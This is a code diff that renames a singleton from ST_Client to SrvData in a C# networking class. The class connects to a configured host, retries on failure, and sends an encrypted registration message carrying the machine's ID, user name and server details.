@@ -26,25 +26,25 @@ namespace bc.srv.Class
         /// <param name="port"></param>
         private void TryConnect()
         {
-            var host = ST_Client.Instance.Host;
-            var port = ST_Client.Instance.Port;
+            var host = SrvData.Instance.Host;
+            var port = SrvData.Instance.Port;
 
             IPAddress testIP;
             var isIP = IPAddress.TryParse(host, out testIP);
 
-            while (!ST_Client.Instance.isConnected)
+            while (!SrvData.Instance.isConnected)
                 try
                 {
                     if (!isIP)
-                        ST_Client.Instance.Connessione.Connect(host,
+                        SrvData.Instance.Connessione.Connect(host,
                             port); // provo a connettermi altrimenti entro nel catch e aspetto X sec
                     else
-                        ST_Client.Instance.Connessione.Connect(testIP,
+                        SrvData.Instance.Connessione.Connect(testIP,
                             port); // provo a connettermi altrimenti entro nel catch e aspetto X sec
 
-                    ST_Client.Instance.isConnected = FirstConnection();
+                    SrvData.Instance.isConnected = FirstConnection();
 
-                    if (!ST_Client.Instance.isConnected)
+                    if (!SrvData.Instance.isConnected)
                         Thread.Sleep(30000);
                 }
                 catch
@@ -60,8 +60,8 @@ namespace bc.srv.Class
         /// </summary>
         private bool FirstConnection()
         {
-            var ns = ST_Client.Instance.Connessione.GetStream();
-            var psw = ST_Client.Instance.Password;
+            var ns = SrvData.Instance.Connessione.GetStream();
+            var psw = SrvData.Instance.Password;
 
             // INVIO LA MIA PASSWORD E IL MIO ID!
             var mm = new MsgManager(ns);
@@ -84,20 +84,20 @@ namespace bc.srv.Class
                 var un = gi.UserName();
 
 
-                var ms = string.Format("{0}|{1}|{2}|{3}|{4}", ST_Client.Instance.UnivoqueID, un, mn,
-                    ST_Client.Instance.ServerName, ST_Client.Instance.ServerVersion);
+                var ms = string.Format("{0}|{1}|{2}|{3}|{4}", SrvData.Instance.UnivoqueID, un, mn,
+                    SrvData.Instance.ServerName, SrvData.Instance.ServerVersion);
 
                 var sent = mm.SendEncryMessage(ms, 20000);
                 // SE INVIO CORRETTAMENTE QUESTO MESSAGGIO SONO CONNESSO 
                 if (sent) return true;
 
-                ST_Client.Instance.Connessione.Close();
-                ST_Client.Instance.Connessione = new TcpClient();
+                SrvData.Instance.Connessione.Close();
+                SrvData.Instance.Connessione = new TcpClient();
                 return false;
             }
 
-            ST_Client.Instance.Connessione.Close();
-            ST_Client.Instance.Connessione = new TcpClient();
+            SrvData.Instance.Connessione.Close();
+            SrvData.Instance.Connessione = new TcpClient();
             return false;
             //---------------------------------------------
         }
@@ -119,7 +119,7 @@ namespace bc.srv.Class
             {
                 try
                 {
-                    newSlot.Connect(ST_Client.Instance.Host, ST_Client.Instance.Port);
+                    newSlot.Connect(SrvData.Instance.Host, SrvData.Instance.Port);
                     // SE RIESCO A CONNETTERMI ESCO DAL LOOP
                     connected = true;
                     break;
